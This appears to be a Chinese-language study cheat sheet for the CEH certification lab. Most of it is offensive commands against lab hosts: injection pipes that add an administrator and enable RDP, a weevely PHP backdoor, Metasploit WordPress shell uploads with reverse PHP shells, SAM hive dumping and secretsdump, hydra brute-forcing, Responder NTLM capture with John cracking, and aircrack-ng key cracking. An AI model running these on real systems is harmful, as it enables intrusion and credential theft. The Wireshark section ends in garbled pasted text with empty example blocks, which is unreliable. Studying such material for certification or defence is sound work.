


## 連結
- [https://www.cvedetails.com](https://www.cvedetails.com)
- [https://www.exploit-db.com/](https://www.exploit-db.com/)
- [putty](https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe)
- [git](https://git-scm.com/downloads/win)
- [vscode](https://code.visualstudio.com/)
- [hexConvert](https://www.rapidtables.com/convert/number/hex-to-ascii.html)

## linux
```bash
sudo systemctl start ssh # sudo service ssh restart
sudo su

# 查網關
ip route
ifconfig
route -n


# 加使用者cehp、並給sudo
sudo useradd cehp
sudo passwd cehp #會提示你輸入密碼
cut -d: -f1 /etc/passwd | grep cehp
sudo usermod -aG sudo cehp # 或sudo usermod -aG wheel cehp
getent group sudo # getent group wheel
```

## windows
```powershell
ipconfig # echo %userdomain%

# 共享資料夾
net use \\10.10.10.16 apple /u:martin
net view \\10.10.10.16

# 管道
echo 123 | whoami
| net user cehp /add
| net users
| net localgroup Administrators cehp /add
| net localgroup Administrators
| reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Terminal Server" /vfDenyTSConnections /t REG_DWORD /d 0 /f
| netstat -an | findstr :3389

net user cehp
```


## 常用服務和Port

- 22: SSH(Secure Shell)，用於安全遠程登錄。
- 23: Telnet，非加密的遠程登錄服務。
- 25: SMTP(Simple Mail Transfer Protocol)，用於傳輸電子郵件。
- 53: DNS
- 80: HTTP(Hypertext Transfer Protocol)，用於網頁傳輸。
- 88: Kerberos，一种AD网络身份验证协议，广泛用于基于票据的身份验证机制
- 123: NTP(Network Time Protocol)，用於時間同步。
- 135: RPC(Remote Procedure Call)，用於遠程進程調用。
- 137(UDP/TCP): NetBIOS Name Service，用于将计算机名称解析为 IP 地址，类似于 DNS 的功能，但适用于 NetBIOS 网络。NetBIOS 是一种老旧协议，在现代网络中逐渐被替代(如 DNS 和 SMB 直接使用 TCP/445)。
- 138(UDP): NetBIOS Datagram Service，用于在局域网中发送广播消息(如发送网络通知)。
- 139(TCP): NetBIOS Session Service，用于建立和维护基于 NetBIOS 的会话，支持文件共享、打印机共享等功能。
- 161: SNMP，簡單網管。网络设备通过 SNMP 向管理系统报告状态，或者允许管理系统更改设备配置。SNMPv1、SNMPv2c:  明文传输，安全性较低。SNMPv3:  提供认证和加密功能，增强安全性。
- 389: LDAP(Lightweight Directory Access Protocol)，用於訪問目錄服務。
- 443: HTTPS(HTTP over SSL/TLS)，加密的網頁傳輸。
- 445: SMB(Server Message Block)，微軟的檔案、印表機。用於共享文件和資源。
- 636: LDAPS(LDAP over SSL/TLS)，加密的 LDAP。
- 1900: 是 UPnP(通用即插即用) 的核心协议之一。SSDP 用于在局域网中发现网络设备(如打印机、路由器、媒体服务器等)。
- 2049: NFS(Network File System)，用於文件系統共享。
- 3268: Microsoft Global Catalog，Active Directory 全局编录服务
- 3389: RDP
- 5353: Zerocon
- 48101: 常見於物聯網(IOT)設備，特別是 Mirai C&C(Command and Control)。





## 其他指令
```bash
snmp-check 10.10.10.16
nbtscan 10.10.10.1-254
enum4linux 10.10.10.16
enum4linux -u martin -p apple -a 10.10.10.16
hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst smb://10.10.10.16


# 列舉分享資料夾
python3 -m pip install --upgrade impacket
crackmapexec smb 10.10.10.16 -u martin -p apple --shares
```




## 製作後門php
```bash
weevely generate cehp backdoor.php #cehp為後門密碼
weevely http://10.10.10.16:8080/dvwa/hackable/uploads/backdoor.php cehp
```


## WPScan
```bash
whatweb http://10.10.10.16:8080/ceh
wpscan --url http://10.10.10.16:8080/ceh -e u # -e u表示列舉使用者
wpscan --url http://10.10.10.16:8080/ceh -P /usr/share/wordlists/nmap.lst # -e u表示列舉使用者
wpscan --url http://10.10.10.16:8080/ceh --api-token
```



## Metasploit
```bash
sudo service postgresql start
msfconsole

use exploit/unix/webapp/wp_admin_shell_upload
show info
set RHOSTS 10.10.10.16
set RPORT 8080
set TARGETURI /ceh
set USERNAME admin
set PASSWORD qwerty@123
set PAYLOAD php/reverse_php
exploit
```

```bash
msfconsole
use exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload
show info
set RHOSTS 10.10.10.16
set RPORT 8080
set TARGETURI /ceh
set USERNAME cehuser1
set PASSWORD green
set PAYLOAD php/reverse_php
exploit
```


## wordpress外掛
[https://downloads.wordpress.org/plugin/photo-gallery.1.2.5.zip](https://downloads.wordpress.org/plugin/photo-gallery.1.2.5.zip)

## ophcrack

```powershell
e:
E:\CEH-Tools>reg save hklm\sam pwdump\sam
E:\CEH-Tools>reg save hklm\system pwdump\system
```


### 其他解sam
```bash
secretsdump.py LOCAL -system pwdump/system -sam pwdump/sam -outputfile pwdump/10.10.10.10
```

## John
```bash
echo -n hello | md5sum | cut -d " " -f1 >> md5.txt
echo -n apollo | md5sum | cut -d " " -f1 >> md5.txt
echo -n tiger | md5sum | cut -d " " -f1 >> md5.txt
john md5.txt --format=raw-md5
```





## Responder

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

sudo responder -I eth0
# 然後嘗試在windows上登入
# cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt # 看攔截到的資料
cd usr/share/responder/logs
john --wordlist=/usr/share/wordlists/rockyou.txt SMB-NTLMv2-SSP-10.10.10.10.txt
```



## Aircrack-ng


```bash
hydra -L 帳號字典檔路徑 -P 密碼字典檔路徑 ip ftp
hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst ftp://10.10.10.10
hydra -l jason -P 密碼字典檔路徑 10.10.10.10 ftp # jason為目標使用者

aircrack-ng WEPcrack-01.cap # KEY FOUND! [ 98:48:35:97:49 ]
aircrack-ng WPA2crack-01.cap -w /usr/share/wordlists/nmap.lst # KEY FOUND! [ 98:48:35:97:49 ]


```



## SNOW
藏文字於文字檔
```powershell
SNOW.EXE -C -p ceh -m "hello 123" a.txt b.txt
SNOW.EXE -C -p ceh  b.txt
```




## Wireshark
```
ip.src == 192.168.1.1
ip.dst == 192.168.1.2
ip.src == 192.168.1.1 && ip.dst == 192.168.1.2
ip.src == 192.168.1.1 && tcp.srcport == 80
ip.src == 192.168.1.1 && udp.srcport == 53
ip.src == 192.168.1.1 && tcp.srcport >= 1024 && tcp.srcport <= 2048
ip.dst == 192.168.1.2 && tcp.dstport == 443
ip.dst == 192.168.1.2 && udp.dstport == 53
ip.dst == 192.168.1.2 && tcp.dstport >= 1024 && tcp.dstport <= 2048


tcp
udp
icmp
http
ssl
dns
smtp
ftp


tcp.port == 80
tcp.port == 443
udp.port == 53 //udp
tcp.port == 1883 //未加密
tcp.port == 8883 //加密

tcp.flags.syn == 1 && tcp.flags.fin == 0
tcp.flags.fin == 1
tcp.flags.reset == 1
tcp.flags.ack == 1


tcp.srcport >= 1024 && tcp.srcport <= 65535
tcp.dstport >= 1024 && tcp.dstport <= 65535

ip.src == 192.168.1.1 && ip.dst == 192.168.1.2 && tcp
ip.src == 192.168.1.1 && tcp.port == 80
tcp.dstport == 443
ip.src == 192.168.1.1 && tcp.port == 1883
ip.src == 192.168.1.1 && tcp.dstport == 80
ip.src == 192.168.1.1 && ssl
ip.src == 192.168.1.1 && tcp.port == 1883

7. 過濾傳輸協議（TCP/UDP）和某些標頭（如 SYN、FIN）
TCP SYN 標誌（用於建立連接）：

plaintext
複製程式碼
tcp.flags.syn == 1 && tcp.flags.fin == 0
TCP FIN 標誌（用於結束連接）：

plaintext
複製程式碼
tcp.flags.fin == 1
TCP RST 標誌（用於重置連接）：

plaintext
複製程式碼
tcp.flags.reset == 1
TCP ACK 標誌（確認包）：

plaintext
複製程式碼
tcp.flags.ack == 1
8. 過濾端口範圍
過濾源端口範圍：

plaintext
複製程式碼
過濾目的端口範圍：

plaintext
複製程式碼
常見的組合範例：
過濾來源 IP 是 192.168.1.1 且目的 IP 是 192.168.1.2 的所有 TCP 流量：

plaintext
複製程式碼
過濾來源 IP 是 192.168.1.1 且使用 HTTP 協議的流量：

plaintext
複製程式碼
過濾目的端口是 443（HTTPS）的所有流量：

plaintext
複製程式碼
過濾特定源 IP 和端口，並使用 MQTT 協議（端口 1883）：

plaintext
複製程式碼
高級過濾：利用位址和協議組合
Wireshark 允許使用更複雜的過濾器來結合多個條件，以下是一些高級範例：

過濾來自 192.168.1.1 且目的端口為 80 的 HTTP 流量：

plaintext
複製程式碼
過濾來自某個 IP 且使用 SSL/TLS（加密）協議的流量：

plaintext
複製程式碼
過濾來自某個 IP 且使用 MQTT 並且端口為 1883 的流量：

plaintext
複製程式碼
```